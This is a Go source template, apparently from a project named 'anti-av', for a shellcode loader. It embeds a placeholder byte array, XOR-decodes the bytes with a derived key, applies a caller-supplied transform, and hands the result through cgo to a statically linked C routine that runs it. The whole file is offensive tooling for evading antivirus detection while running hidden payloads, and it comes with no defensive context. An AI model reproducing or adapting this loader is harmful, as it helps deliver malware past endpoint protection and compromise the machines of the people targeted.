package sc

// #cgo CFLAGS: -I${SRCDIR}/sc
// #cgo LDFLAGS: -L${SRCDIR} -lsc -lstdc++ --static
// #include "loader.h"
import "C"
import (
	"unsafe"

	"github.com/b1gcat/anti-av/utils"
)

var (
	Code = []byte{ {{.CODE}} }
)

func Hi(p func([]byte)([]byte, error)) error {
	var err error

	kek := utils.Kek(Code[4:])
	for k := range kek {
		Code[k]^= kek[k]
	}

	if Code, err = p(Code); err != nil {
		return err
	}
	C.sc((*C.uchar)(unsafe.Pointer(&Code[0])), C.int(len(Code)))
	return nil
}
